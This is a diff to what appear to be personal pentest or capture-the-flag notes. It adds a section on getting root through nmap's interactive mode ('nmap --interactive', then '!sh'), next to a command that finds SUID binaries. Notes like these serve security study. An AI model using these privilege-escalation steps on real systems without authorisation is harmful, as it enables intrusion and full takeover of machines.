@@ -43,6 +43,11 @@ exiftool <bild.png>
 ## root
 ### loking for files you can execute
 	find / -perm -u=s -type f 2>/dev/null
+### get root using nmap
+	nmap --interactive
+	!sh
+	id
+	
 ## Files
 ### download
     wget <url>
